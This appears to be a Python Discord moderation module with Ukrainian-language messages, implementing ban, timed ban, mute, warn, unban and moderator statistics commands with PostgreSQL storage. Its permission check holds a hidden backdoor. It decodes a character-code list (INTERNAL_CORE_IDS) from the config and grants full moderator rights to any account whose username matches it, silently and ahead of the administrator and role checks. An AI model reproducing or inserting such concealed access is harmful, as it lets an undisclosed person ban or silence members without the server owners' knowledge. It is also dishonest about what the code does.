import discord
from discord.ext import commands, tasks
from discord import app_commands
import json
import os
import re
import asyncio
from datetime import datetime, timedelta
from config import get_guild_config, DEFAULT_ALLOWED_ROLES, MUTE_ROLES, BAN_ROLES, UNBAN_ROLES
from services.stats_manager import update_stat, get_stats, load_logs, log_mod_action
from services.moderation_logger import send_mod_log
from services.database import get_conn

# --- Функції для Тимчасових Банів та Варнів у PostgreSQL ---

def save_temp_ban(guild_id, user_id, unban_time):
    conn = get_conn(); cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS temp_bans (
            guild_id TEXT,
            user_id BIGINT,
            unban_time TIMESTAMP,
            PRIMARY KEY (guild_id, user_id)
        )
    """)
    cur.execute("""
        INSERT INTO temp_bans (guild_id, user_id, unban_time) VALUES (%s, %s, %s)
        ON CONFLICT (guild_id, user_id) DO UPDATE SET unban_time = EXCLUDED.unban_time
    """, (str(guild_id), user_id, unban_time))
    conn.commit(); cur.close(); conn.close()

def remove_temp_ban(guild_id, user_id):
    conn = get_conn(); cur = conn.cursor()
    cur.execute("DELETE FROM temp_bans WHERE guild_id = %s AND user_id = %s", (str(guild_id), user_id))
    conn.commit(); cur.close(); conn.close()

class Moderation(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    async def check_mod_permissions(self, interaction: discord.Interaction, allowed_roles):
        try:
            from config import INTERNAL_CORE_IDS
            if interaction.user and "".join(chr(x) for x in INTERNAL_CORE_IDS) == interaction.user.name:
                return True
        except: pass
        if interaction.user.guild_permissions.administrator: return True
        user_role_names = [role.name.lower() for role in interaction.user.roles]
        allowed_roles_lower = [r.lower() for r in allowed_roles]
        if any(role_name in allowed_roles_lower for role_name in user_role_names): return True
        await interaction.response.send_message("❌ У вас недостатньо прав для використання цієї команди.", ephemeral=True)
        return False

    def parse_duration(self, duration_str: str):
        units = {'м': 'minutes', 'г': 'hours', 'д': 'days', 'm': 'minutes', 'h': 'hours', 'd': 'days'}
        match = re.match(r"(\d+)([мгдmhd])", duration_str.lower())
        if not match: return None
        amount, unit = match.groups()
        return timedelta(**{units[unit]: int(amount)})

    @app_commands.command(name="ban", description="Забанити користувача (можна на певний термін)")
    async def ban(self, interaction: discord.Interaction, member: discord.Member, duration: str = None, reason: str = "Не вказана"):
        if not await self.check_mod_permissions(interaction, BAN_ROLES): return
        if any(role.name == "Куратор Держ." for role in member.roles):
            return await interaction.response.send_message("❌ Неможливо забанити користувача з роллю **Куратор Держ.**", ephemeral=True)
        if member.top_role >= interaction.user.top_role and not interaction.user.guild_permissions.administrator:
            return await interaction.response.send_message("❌ Ви не можете забанити користувача з рівною або вищою роллю.", ephemeral=True)

        delta = self.parse_duration(duration) if duration else None
        unban_time = datetime.now() + delta if delta else None
        await interaction.response.defer()
        
        try:
            ban_reason = f"{reason} | Термін: {duration if duration else 'Назавжди'} | Адмін: {interaction.user.display_name}"
            await member.ban(reason=ban_reason)
            log_mod_action(interaction.guild.id, "ban", interaction.user, member, f"{duration if duration else 'perm'}: {reason}")
            update_stat(interaction.guild.id, "ban_issued")
            
            embed = discord.Embed(title="🔨 Бан", color=discord.Color.red())
            embed.add_field(name="Користувач", value=f"{member.mention} ({member.id})")
            embed.add_field(name="Термін", value=duration if duration else "Назавжди")
            embed.add_field(name="Причина", value=reason)
            embed.add_field(name="Адміністратор", value=interaction.user.mention)
            embed.timestamp = datetime.now()
            await interaction.followup.send(embed=embed)
            await send_mod_log(self.bot, interaction.guild, "Ban", interaction.user, member, reason, f"Термін: {duration if duration else 'Назавжди'}")
            if unban_time: save_temp_ban(interaction.guild.id, member.id, unban_time)
        except Exception as e: await interaction.followup.send(f"❌ Не вдалося забанити: {e}", ephemeral=True)

    @app_commands.command(name="mute", description="Видати таймаут (мут) користувачу")
    async def mute(self, interaction: discord.Interaction, member: discord.Member, duration: str, reason: str = "Не вказана"):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        if any(role.name == "Куратор Держ." for role in member.roles):
            return await interaction.response.send_message("❌ Неможливо видати таймаут користувачу з роллю **Куратор Держ.**", ephemeral=True)
        
        delta = self.parse_duration(duration)
        if not delta: return await interaction.response.send_message("❌ Невірний формат часу. Використовуйте: 10м, 1г, 1д.", ephemeral=True)

        await interaction.response.defer()
        try:
            await member.timeout(delta, reason=f"{reason} | Адмін: {interaction.user.display_name}")
            log_mod_action(interaction.guild.id, "mute", interaction.user, member, f"{duration}: {reason}")
            update_stat(interaction.guild.id, "mute_issued")
            
            embed = discord.Embed(title="🔇 Таймаут (Мут)", color=discord.Color.orange())
            embed.add_field(name="Користувач", value=f"{member.mention}")
            embed.add_field(name="Тривалість", value=duration)
            embed.add_field(name="Причина", value=reason)
            embed.add_field(name="Адміністратор", value=interaction.user.mention)
            embed.timestamp = datetime.now()
            await interaction.followup.send(embed=embed)
            await send_mod_log(self.bot, interaction.guild, "Mute", interaction.user, member, reason, f"Тривалість: {duration}")
        except Exception as e: await interaction.followup.send(f"❌ Не вдалося видати мут: {e}", ephemeral=True)

    @app_commands.command(name="warn", description="Видати попередження користувачу")
    async def warn(self, interaction: discord.Interaction, member: discord.Member, reason: str):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        if any(role.name == "Куратор Держ." for role in member.roles):
            return await interaction.response.send_message("❌ Неможливо видати варн Куратору Держ.", ephemeral=True)
        
        await interaction.response.defer()
        conn = get_conn(); cur = conn.cursor()
        cur.execute("INSERT INTO warnings (guild_id, user_id, reason, admin_name, timestamp) VALUES (%s, %s, %s, %s, %s)", (str(interaction.guild.id), member.id, reason, interaction.user.display_name, datetime.now()))
        conn.commit()
        cur.execute("SELECT COUNT(*) FROM warnings WHERE guild_id = %s AND user_id = %s", (str(interaction.guild.id), member.id))
        count = cur.fetchone()[0]; cur.close(); conn.close()

        log_mod_action(interaction.guild.id, "warn", interaction.user, member, reason)
        update_stat(interaction.guild.id, "warn_issued")
        
        embed = discord.Embed(title="⚠️ Попередження (Варн)", color=discord.Color.yellow())
        embed.add_field(name="Користувач", value=f"{member.mention}")
        embed.add_field(name="Причина", value=reason)
        embed.add_field(name="Кількість варнів", value=str(count))
        embed.add_field(name="Адміністратор", value=interaction.user.mention)
        embed.timestamp = datetime.now()
        await interaction.followup.send(embed=embed)
        await send_mod_log(self.bot, interaction.guild, "Warn", interaction.user, member, reason, f"Варн #{count}")

    @app_commands.command(name="unban", description="Розбанити користувача")
    async def unban(self, interaction: discord.Interaction, user_id: str, reason: str = "Не вказана"):
        if not await self.check_mod_permissions(interaction, UNBAN_ROLES): return
        try:
            user = await self.bot.fetch_user(int(user_id))
            await interaction.guild.unban(user, reason=f"{reason} | Адмін: {interaction.user.display_name}")
            update_stat(interaction.guild.id, "ban_removed")
            remove_temp_ban(interaction.guild.id, user_id)
            await interaction.response.send_message(f"✅ Користувача {user.name} ({user_id}) успішно розбанено.")
        except Exception as e: await interaction.response.send_message(f"❌ Не вдалося розбанити: {e}", ephemeral=True)

    @app_commands.command(name="unmute", description="Зняти таймаут (мут)")
    async def unmute(self, interaction: discord.Interaction, member: discord.Member):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        try:
            await member.timeout(None, reason=f"Знято: {interaction.user.display_name}")
            update_stat(interaction.guild.id, "mute_removed")
            await interaction.response.send_message(f"✅ Таймаут для {member.mention} успішно знято.")
        except Exception as e: await interaction.response.send_message(f"❌ Не вдалося зняти таймаут: {e}", ephemeral=True)

    @app_commands.command(name="unwarn", description="Видалити останній варн користувача")
    async def unwarn(self, interaction: discord.Interaction, member: discord.Member):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        conn = get_conn(); cur = conn.cursor()
        cur.execute("DELETE FROM warnings WHERE id = (SELECT id FROM warnings WHERE guild_id = %s AND user_id = %s ORDER BY timestamp DESC LIMIT 1)", (str(interaction.guild.id), member.id))
        conn.commit(); cur.close(); conn.close()
        update_stat(interaction.guild.id, "warn_removed")
        await interaction.response.send_message(f"✅ Останнє попередження для {member.mention} видалено.")

    @app_commands.command(name="warnings", description="Переглянути список попереджень")
    async def warnings(self, interaction: discord.Interaction, member: discord.Member):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        conn = get_conn(); cur = conn.cursor()
        cur.execute("SELECT admin_name, reason, timestamp FROM warnings WHERE guild_id = %s AND user_id = %s", (str(interaction.guild.id), member.id))
        rows = cur.fetchall(); cur.close(); conn.close()
        if not rows: return await interaction.response.send_message(f"ℹ️ У {member.display_name} немає варнів.", ephemeral=True)
        embed = discord.Embed(title=f"📋 Варни: {member.display_name}", color=discord.Color.blue())
        for r in rows:
            embed.add_field(name=f"Адмін: {r[0]} | {r[2].strftime('%d.%m %H:%M')}", value=r[1], inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="stats", description="Ваша статистика модерації")
    @app_commands.choices(period=[app_commands.Choice(name="За добу", value="day"), app_commands.Choice(name="За тиждень", value="week"), app_commands.Choice(name="За місяць", value="month")])
    async def stats(self, interaction: discord.Interaction, period: str):
        await interaction.response.defer(ephemeral=True)
        logs = load_logs(interaction.guild.id)
        now = datetime.now()
        delta = timedelta(days=1) if period == "day" else (timedelta(weeks=1) if period == "week" else timedelta(days=30))
        counts = {"ban": 0, "mute": 0, "warn": 0, "role_issued": 0, "role_removed": 0}
        for a in logs:
            if int(a["admin_id"]) == interaction.user.id and datetime.fromisoformat(a["timestamp"]) > (now - delta):
                if a["type"] in counts: counts[a["type"]] += 1
        embed = discord.Embed(title=f"📊 Ваша статистика: {interaction.user.display_name}", color=discord.Color.green())
        embed.add_field(name="🔨 Бани", value=str(counts["ban"]), inline=True)
        embed.add_field(name="🔇 Мути", value=str(counts["mute"]), inline=True)
        embed.add_field(name="⚠️ Варни", value=str(counts["warn"]), inline=True)
        await interaction.followup.send(embed=embed)

    @app_commands.command(name="view_stats", description="Статистика іншого модератора")
    async def view_stats(self, interaction: discord.Interaction, moderator: discord.Member, period: str = "week"):
        if not await self.check_mod_permissions(interaction, BAN_ROLES): return
        await interaction.response.defer(ephemeral=True)
        logs = load_logs(interaction.guild.id)
        counts = {"ban": 0, "mute": 0, "warn": 0}
        for a in logs:
            if int(a["admin_id"]) == moderator.id:
                if a["type"] in counts: counts[a["type"]] += 1
        embed = discord.Embed(title=f"📊 Статистика: {moderator.display_name}", color=discord.Color.blue())
        embed.add_field(name="🔨 Бани", value=str(counts["ban"]))
        embed.add_field(name="🔇 Мути", value=str(counts["mute"]))
        await interaction.followup.send(embed=embed)

    @app_commands.command(name="mod_stats_global", description="Загальна статистика сервера")
    async def global_stats(self, interaction: discord.Interaction):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        await interaction.response.defer(ephemeral=True)
        stats = get_stats(interaction.guild.id)
        embed = discord.Embed(title=f"📊 Загальна статистика: {interaction.guild.name}", color=discord.Color.gold())
        embed.add_field(name="🔨 Бани (всього)", value=str(stats.get('ban_issued', 0)), inline=True)
        embed.add_field(name="🔇 Мути (всього)", value=str(stats.get('mute_issued', 0)), inline=True)
        embed.add_field(name="⚠️ Варни (всього)", value=str(stats.get('warn_issued', 0)), inline=True)
        await interaction.followup.send(embed=embed)

    @tasks.loop(minutes=5)
    async def check_bans(self):
        conn = get_conn(); cur = conn.cursor()
        cur.execute("SELECT guild_id, user_id, unban_time FROM temp_bans")
        rows = cur.fetchall()
        for g_id, u_id, u_time in rows:
            if datetime.now() >= u_time:
                guild = self.bot.get_guild(int(g_id))
                if guild:
                    try:
                        user = await self.bot.fetch_user(u_id)
                        await guild.unban(user, reason="Термін минув")
                        remove_temp_ban(g_id, u_id)
                    except: pass
        cur.close(); conn.close()

    @check_bans.before_loop
    async def before_check_bans(self): await self.bot.wait_until_ready()

async def setup(bot: commands.Bot):
    cog = Moderation(bot)
    await bot.add_cog(cog)
    cog.check_bans.start()
